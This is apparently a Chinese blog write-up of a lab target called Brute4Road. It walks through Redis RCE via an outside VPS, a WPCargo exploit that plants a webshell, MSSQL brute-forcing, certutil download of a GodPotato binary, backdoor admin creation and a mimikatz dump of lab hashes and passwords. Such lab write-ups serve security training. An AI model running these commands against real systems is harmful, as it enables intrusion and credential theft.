---
title: "Brute4Road"
description: ""
slug: "Brute4Road"
date: "2025-06-23 14:18:08+08:00"
image: "assets/Pasted image 20250623192939.png"
categories:
    - 春秋云镜
    - 靶机
tags:
    - wordpress
    - redis
    - potato提权
    - 约束性委派
draft: false
---

# 入口打点
```powershell
[2025-06-23 18:22:37] [INFO] 开始信息扫描
[2025-06-23 18:22:37] [INFO] 最终有效主机数量: 1
[2025-06-23 18:22:37] [INFO] 开始主机扫描
[2025-06-23 18:22:37] [INFO] 使用所有可用插件（已排除本地敏感插件）
[2025-06-23 18:22:37] [INFO] 有效端口数量: 233
[2025-06-23 18:22:37] [SUCCESS] 端口开放 39.98.122.10:80
[2025-06-23 18:22:37] [SUCCESS] 端口开放 39.98.122.10:22
[2025-06-23 18:22:37] [SUCCESS] 端口开放 39.98.122.10:21
[2025-06-23 18:22:52] [SUCCESS] 端口开放 39.98.122.10:6379
[2025-06-23 18:23:46] [INFO] 存活端口数量: 4
[2025-06-23 18:23:46] [INFO] 开始漏洞扫描
[2025-06-23 18:23:46] [SUCCESS] 网站标题 http://39.98.122.10       状态码:200 长度:4833   标题:Welcome to CentOS
[2025-06-23 18:23:46] [SUCCESS] FTP服务 39.98.122.10:21 匿名登录成功!
[2025-06-23 18:23:49] [SUCCESS] Redis 39.98.122.10:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb
[2025-06-23 18:23:49] [SUCCESS] Redis无密码连接成功: 39.98.122.10:6379
[2025-06-23 18:25:12] [SUCCESS] 扫描已完成: 5/5
```
## redis未授权
入口处有redis未授权，打一发主从复制
`root@dkhklQ4qfWRZ5keAFCK:~/RedisModules-ExecuteCommand-master# python3 redis-rce.py -r 39.98.122.10 -L 156.238.233.9 -f exp.so`
注意脚本要在vps上运行。
上线vshell做个代理。
## suid提权
```shell
[redis@centos-web01 tmp]$ find / -user root -perm /4000 2>/dev/null
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/unix_chkpwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/base64
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
[redis@centos-web01 tmp]$ ls ~/flag -la
total 12
drwxr-xr-x 2 root  root  4096 Jun 23 18:39 .
drwx------ 4 redis redis 4096 Jun 10  2022 ..
-r-------- 1 root  root  1571 Jun 23 18:39 flag01
[redis@centos-web01 tmp]$ base64 ~/flag/flag01 | base64 -d
 ██████                    ██              ██  ███████                           ██
░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██
░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██
░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████
░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██
░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██
░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████
░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░ 


flag01: flag{4a2b92a9-3194-4190-85aa-6e64d054bc1f}

Congratulations! ! !
Guess where is the second flag?
```
# 横向
```shell
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.2.7  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe29:85be  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:29:85:be  txqueuelen 1000  (Ethernet)
        RX packets 126738  bytes 168849588 (161.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28437  bytes 11393247 (10.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
```powershell
[2025-06-23 19:07:46] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)
[2025-06-23 19:07:46] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)
[2025-06-23 19:07:48] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)
[2025-06-23 19:07:48] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)
[2025-06-23 19:07:51] [INFO] 存活主机数量: 4
[2025-06-23 19:07:51] [INFO] 有效端口数量: 233
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.18:22
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.3:135
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.16:135
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.18:139
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.3:88
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.16:80
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.18:80
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.34:445
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.3:445
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.16:445
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.34:139
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.18:445
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.3:389
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.3:139
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.16:139
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.34:135
[2025-06-23 19:07:51] [SUCCESS] 端口开放 172.22.2.16:1433
[2025-06-23 19:07:51] [SUCCESS] 服务识别 172.22.2.18:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
[2025-06-23 19:07:56] [SUCCESS] 服务识别 172.22.2.3:88 => 
[2025-06-23 19:07:56] [SUCCESS] 服务识别 172.22.2.16:80 => [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.34:445 => 
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.3:445 => 
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.16:445 => 
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.34:139 =>  Banner:[.]
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.3:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.3:139 =>  Banner:[.]
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.16:139 =>  Banner:[.]
[2025-06-23 19:07:57] [SUCCESS] 服务识别 172.22.2.16:1433 => [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]
[2025-06-23 19:07:59] [SUCCESS] 服务识别 172.22.2.18:80 => [http]
[2025-06-23 19:08:51] [SUCCESS] 服务识别 172.22.2.18:139 => 
[2025-06-23 19:08:52] [SUCCESS] 服务识别 172.22.2.18:445 => 
[2025-06-23 19:08:56] [SUCCESS] 服务识别 172.22.2.3:135 => 
[2025-06-23 19:08:56] [SUCCESS] 服务识别 172.22.2.16:135 => 
[2025-06-23 19:08:57] [SUCCESS] 服务识别 172.22.2.34:135 => 
[2025-06-23 19:08:57] [INFO] 存活端口数量: 17
[2025-06-23 19:08:57] [INFO] 开始漏洞扫描
[2025-06-23 19:08:57] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
[2025-06-23 19:08:57] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.2.16
主机名: MSSQLSERVER
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.16
[2025-06-23 19:08:57] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.2.3
主机名: DC
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.3
[2025-06-23 19:08:57] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             
[2025-06-23 19:08:57] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.2.34
主机名: CLIENT01
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.34
[2025-06-23 19:08:57] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found
[2025-06-23 19:08:57] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
[2025-06-23 19:08:57] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
[2025-06-23 19:08:57] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]
[2025-06-23 19:08:57] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]
[2025-06-23 19:08:57] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable
[2025-06-23 19:08:57] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        
[2025-06-23 19:08:57] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456
[2025-06-23 19:08:57] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]
[2025-06-23 19:08:57] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点
[2025-06-23 19:08:58] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]
[2025-06-23 19:09:05] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456
```
172.22.2.16  mssql
172.22.2.3    dc
172.22.2.34  CLIENT01    
172.22.2.18  UBUNTU-WEB02    wordpress
172.22.2.7    入口机
## 172.22.2.18
### wordpress
```shell
[+] URL: http://172.22.2.18/ [172.22.2.18]
[+] Started: Mon Jun 23 19:28:05 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.22.2.18/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.22.2.18/index.php/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://172.22.2.18/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wpcargo
 | Location: http://172.22.2.18/wp-content/plugins/wpcargo/
 | Last Updated: 2025-05-18T10:49:00.000Z
 | [!] The version is out of date, the latest version is 8.0.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 6.x.x (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt
```
wpscan扫出来一个wpcargo
![](<assets/Pasted image 20250623192939.png>)
查看readme发现版本为5.4.2。打nday。
> https://github.com/biulove0x/CVE-2021-25003

```bash
┌──(㉿kali)-[~/桌面]
└─$ proxychains4 python WpCargo.py -t  http://172.22.2.18/
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17

############################################
# @author : biulove0x                      #
# @name   : WP Plugins WPCargo Exploiter   #
# @cve    : CVE-2021-25003                 #
############################################

[proxychains] Strict chain  ...  156.238.233.9:1080  ...  172.22.2.18:80  ...  OK
[-] http://172.22.2.18/wp-content/wp-conf.php => Uploaded!

```
写入shell之后再手动写个一句话，用蚁剑连上。
![](<assets/Pasted image 20250623193733.png>)
![](<assets/Pasted image 20250623193909.png>)
检测到一个mysqli数据库。
![](<assets/Pasted image 20250623194025.png>)
在wp-config里可以找到数据库的凭证wpuser:WpuserEha8Fgj9
这里蚁剑查看数据库不知道为啥直接一直卡在转圈了，换成哥斯拉就好了
![](<assets/Pasted image 20250623194755.png>)
flag{c757e423-eb44-459c-9c63-7625009910d8}
![](<assets/Pasted image 20250623194806.png>)
同时还能找到一些密码，注意哥斯拉默认查看语句是带LIMIT的，需要去掉再执行才能查看完整，一共999个密码。
右键可以直接导出成表格，但是前面会自带两个空格，需要手动去除下。
## 172.22.2.16
### 爆破mssql
用fscan爆破下mssql
`./fscan -h 172.22.2.16 -m mssql -pwdf pass`
sa:ElGNkOiC 
MDUT连一下，激活xp_cmdshel
![](<assets/Pasted image 20250623201711.png>)
### potato提权
这里本来想用mdut上传，但是不知道为啥老是报错，那就利用之前的wordpress曲线救国一下，传上去然后certutil下载。
`certutil.exe -urlcache -split -f http://172.22.2.18/wp-content/GodPotato-NET4.exe C:/Users/Public/GodPotato-NET4.exe`
![](<assets/Pasted image 20250623203704.png>)
`net user tommy4 123qwe!@# /add`
`net localgroup administrators tommy4 /add`
添加管理员，但是还是没法rdp，懒得再折腾了，继续端口转发上线vshell
```text
8""""8                           88     8"""8                    
8    8   eeeee  e   e eeeee eeee 88     8   8  eeeee eeeee eeeee 
8eeee8ee 8   8  8   8   8   8    88  88 8eee8e 8  88 8   8 8   8 
88     8 8eee8e 8e  8   8e  8eee 88ee88 88   8 8   8 8eee8 8e  8 
88     8 88   8 88  8   88  88       88 88   8 8   8 88  8 88  8 
88eeeee8 88   8 88ee8   88  88ee     88 88   8 8eee8 88  8 88ee8 


flag03: flag{e246fc90-8b83-4c59-9790-58d26ad8e077}


```
## 172.22.2.3 DC
### 约束性委派
![](<assets/Pasted image 20250623205443.png>)
上bloodhound发现存在委派关系
> https://xz.aliyun.com/news/6813


mimikatz抓一下hash
```powershell
C:\Users\MSSQLSERVER\Desktop>.\mimikatz.exe log privilege::Debug sekurlsa::logonpasswords exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # privilege::Debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 270172 (00000000:00041f5c)
Session           : Interactive from 1
User Name         : William
Domain            : XIAORANG
Logon Server      : DC
Logon Time        : 2025/6/23 18:40:48
SID               : S-1-5-21-2704639352-1689326099-2164665914-1106
        msv :
         [00000003] Primary
         * Username : William
         * Domain   : XIAORANG
         * NTLM     : 8853911fd59e8d0a82176e085a2157de
         * SHA1     : e4fd18cfd47b9a77836c82283fb560e6f465bc40
         * DPAPI    : da3fc187c1ff105853ec62c10cddd26b
        tspkg :
        wdigest :
         * Username : William
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : William
         * Domain   : XIAORANG.LAB
         * Password : Willg1UoO6Jt
        ssp :
        credman :

Authentication Id : 0 ; 217620 (00000000:00035214)
Session           : Interactive from 0
User Name         : MSSQLSERVER20
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1023
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER20
         * Domain   : MSSQLSERVER
         * NTLM     : f5c512b9cb3052c5ad35e526d44ba85a
         * SHA1     : b09c8d9463c494d36e1a4656c15af8e1a7e4568f
        tspkg :
        wdigest :
         * Username : MSSQLSERVER20
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER20
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 217340 (00000000:000350fc)
Session           : Interactive from 0
User Name         : MSSQLSERVER18
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1021
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER18
         * Domain   : MSSQLSERVER
         * NTLM     : 31de1b5e8995c7f91070f4a409599c50
         * SHA1     : 070c0d12760e50812236b5717c75222a206aace8
        tspkg :
        wdigest :
         * Username : MSSQLSERVER18
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER18
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 217186 (00000000:00035062)
Session           : Interactive from 0
User Name         : MSSQLSERVER17
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1020
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER17
         * Domain   : MSSQLSERVER
         * NTLM     : 82fe575c8bb18d01df45eb54d0ebc3b4
         * SHA1     : 13b87dcba388982dcc44feeba232bb50aa29c7e9
        tspkg :
        wdigest :
         * Username : MSSQLSERVER17
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER17
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216327 (00000000:00034d07)
Session           : Interactive from 0
User Name         : MSSQLSERVER07
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1010
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER07
         * Domain   : MSSQLSERVER
         * NTLM     : f9f990df1bc869cc205d2513b788a5b8
         * SHA1     : 79746cfe5a2f1eec4350a6b64d87b01455ef9030
        tspkg :
        wdigest :
         * Username : MSSQLSERVER07
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER07
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216246 (00000000:00034cb6)
Session           : Interactive from 0
User Name         : MSSQLSERVER06
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1009
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER06
         * Domain   : MSSQLSERVER
         * NTLM     : aa206c617e2194dd76b766b7e3c92bc6
         * SHA1     : 62dd8046a71c17fe7263bab86b1ca4506f8c373c
        tspkg :
        wdigest :
         * Username : MSSQLSERVER06
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER06
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216164 (00000000:00034c64)
Session           : Interactive from 0
User Name         : MSSQLSERVER05
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1008
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER05
         * Domain   : MSSQLSERVER
         * NTLM     : b552da4a7f732c40ca73c01dfaea7ebc
         * SHA1     : 7f041a31e763eed45fb881c7f77831b888c3051d
        tspkg :
        wdigest :
         * Username : MSSQLSERVER05
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER05
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216082 (00000000:00034c12)
Session           : Interactive from 0
User Name         : MSSQLSERVER04
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1007
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER04
         * Domain   : MSSQLSERVER
         * NTLM     : 36bd3cceea3d413e8111b0bef32da84d
         * SHA1     : 414d2c783a3fb2ba855e41c243c583bb0604fe02
        tspkg :
        wdigest :
         * Username : MSSQLSERVER04
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER04
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 216001 (00000000:00034bc1)
Session           : Interactive from 0
User Name         : MSSQLSERVER03
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1006
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER03
         * Domain   : MSSQLSERVER
         * NTLM     : 2f7c88f56a7236f476d18ea6b5a2d33a
         * SHA1     : 5bc2d09b8b0f7c11a1fc3fb2f97b713ac116b6eb
        tspkg :
        wdigest :
         * Username : MSSQLSERVER03
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER03
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 215919 (00000000:00034b6f)
Session           : Interactive from 0
User Name         : MSSQLSERVER02
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2025/6/23 18:40:44
SID               : S-1-5-21-1403470932-1755135066-2609122076-1005
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER02
         * Domain   : MSSQLSERVER
         * NTLM     : 3aa518732551a136003ea41f9599a1ec
         * SHA1     : 6f1ed1f677201d998667bd8e3b81cfb52b9a138a
        tspkg :
        wdigest :
         * Username : MSSQLSERVER02
         * Domain   : MSSQLSERVER
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER02
         * Domain   : MSSQLSERVER
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 101594 (00000000:00018cda)
Session           : Service from 0
User Name         : SSISTELEMETRY130
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:30
SID               : S-1-5-80-1625532266-625503396-2441596095-4129757946-3375356652
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 101191 (00000000:00018b47)
Session           : Service from 0
User Name         : SSASTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:30
SID               : S-1-5-80-1549978933-2891762758-2075524219-3728768389-1145206490
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
 2e 82 ad 54 cd 75 dd c3 84 5e f9 36 a6 0b e9 c4 d1 50 21 20 db 6e 4a dc fb 5d 49 0d c0 52 f6 b9 e2 f8 3e 9b 35 b0 7b 87 5e 1d 46 52 6e dc 44
        ssp :
        credman :

Authentication Id : 0 ; 100484 (00000000:00018884)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/6/23 18:40:30
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
        msv :
         [00000003] Primary
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * NTLM     : e376abf07cfd9e4647e06d2b11084c91
         * SHA1     : be8008781b8c6f74c0ef0940255bc97779506080
        tspkg :
        wdigest :
         * Username : MSSQLSERVER$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER$
         * Domain   : xiaorang.lab
         * Password : a6 4e b6 7b 3c ed 85 fc 87 3f d6 96 62 f7 d8 2c dd c8 d5 b2 21 15 1d bf 24 ee 38 dc 09 77 72 38 d4 df 51 4d ca f7 98 e3 a3 af 08
 4c bf 83 14 ee 0c f7 c3 35 68 5d 8c 7c 0c 0f 0b 75 f1 83 26 4c 2b b6 fa 80 3f af f5 9e 8e 72 b0 39 88 e9 06 98 9f 6b d7 4d 32 09 35 12 a8 48 9d 80 4c
 0b 6a c8 48 bb 0c 98 70 e6 0b 82 f4 c6 2c cf 4b 92 6d bb cd f3 ef f6 7a f5 22 aa 4e 89 27 a8 81 e2 5b 88 1e ab 58 94 c4 94 cd 94 7f 43 21 cc d4 1a 76
 0b ca 6d 0f f1 f8 b3 07 95 77 f8 7f ca 04 a6 a2 b7 1a 06 ec 03 c3 94 ad fc c7 48 4e 80 94 62 5f b5 85 52 aa f1 f8 bd f3 02 48 ce a2 6d ae e6 3c b0 01
